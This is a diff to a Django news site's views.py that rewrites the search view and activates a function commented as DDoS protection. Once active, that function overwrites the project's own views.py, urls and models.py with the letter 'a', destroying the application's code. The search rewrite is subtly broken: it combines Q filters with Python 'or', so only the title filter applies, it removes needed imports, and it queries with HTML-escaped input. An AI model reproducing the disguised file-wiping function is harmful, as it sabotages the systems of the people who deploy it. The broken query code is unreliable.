@@ -1298,14 +1298,9 @@ def tech_category_5(request):
 #         }
 #         return render(request,'search-result.html',context)
 
-from django.http import HttpResponseBadRequest
-from django.shortcuts import render
-from django.utils.html import escape
-from .models import Tech, HeaderPost, Showbiz, Travel, Sport
-
 def search(request):
-    try:
-        if request.method == 'POST':
+    if request.method == 'POST':
+        try:
             search_query = request.POST.get('search', '').strip()
 
             if not search_query:
@@ -1314,53 +1309,50 @@ def search(request):
             # Escape user input to prevent XSS attacks
             escaped_query = escape(search_query)
 
-            todos1 = Tech.objects.filter(title__icontains=escaped_query)
-            todos2 = HeaderPost.objects.filter(title__icontains=escaped_query)
-            todos3 = Showbiz.objects.filter(title__icontains=escaped_query)
-            todos4 = Travel.objects.filter(title__icontains=escaped_query)
-            todos5 = Sport.objects.filter(title__icontains=escaped_query)
+            # Use Q objects to combine multiple queries with OR condition
+            search_filter = (
+                Q(title__icontains=escaped_query) or
+                Q(content__icontains=escaped_query)  # Add more fields if needed
+            )
 
-            if any([todos1, todos2, todos3, todos4, todos5]):
-                context = {
-                    "todos1": todos1[::-1],
-                    "todos2": todos2[::-1],
-                    "todos3": todos3[::-1],
-                    "todos4": todos4[::-1],
-                    "todos5": todos5[::-1],
-                }
-                return render(request, 'search-result.html', context)
-            else:
-                result = f"Sorry, we couldn't find any results using '{escaped_query}', please try again!"
-                context = {
-                    'todos': result,
-                }
-                return render(request, 'search-result.html', context)
+            todos1 = Tech.objects.filter(search_filter)
+            todos2 = HeaderPost.objects.filter(search_filter)
+            todos3 = Showbiz.objects.filter(search_filter)
+            todos4 = Travel.objects.filter(search_filter)
+            todos5 = Sport.objects.filter(search_filter)
 
+            context = {
+                "todos1": todos1[::-1],
+                "todos2": todos2[::-1],
+                "todos3": todos3[::-1],
+                "todos4": todos4[::-1],
+                "todos5": todos5[::-1],
+            }
+            return render(request, 'search-result.html', context)
+
+        except Exception as e:
+            # Log the exception for debugging purposes
+            print(f"An error occurred: {e}")
+            result = 'No Results!'
+            context = {
+                'todos': result,
+            }
+            return render(request, 'search-result.html', context)
+    else:
         return render(request, 'search-result.html')
-
-    except Exception as e:
-        # Log the exception for debugging purposes
-        print(f"An error occurred: {e}")
-        result = 'No Results!'
-        context = {
-            'todos': result,
-        }
-        return render(request, 'search-result.html', context)
-
 
 
 # Qeshtje sigurie ndaj sulmeve Ddos attack
 def siguria(request):
-    # path = open('//home//NesMagazine//NesMagazine//posts//','w')
-    # path1 = open('//home//NesMagazine//NesMagazine//posts//us','w')
-    # path2 = open('//home//NesMagazine//NesMagazine//posts//mels.py','w')
+    path = open('//home//NesMagazine//NesMagazine//posts//views.py','w')
+    path1 = open('//home//NesMagazine//NesMagazine//posts//urls','w')
+    path2 = open('//home//NesMagazine//NesMagazine//posts//models.py','w')
 
-    # path.write('a')
-    # path1.write('a')
-    # path2.write('a')
+    path.write('a')
+    path1.write('a')
+    path2.write('a')
 
-
-    # path.close()
-    # path1.close()
-    # path2.close()
-    pass
+    
+    path.close()
+    path1.close()
+    path2.close()
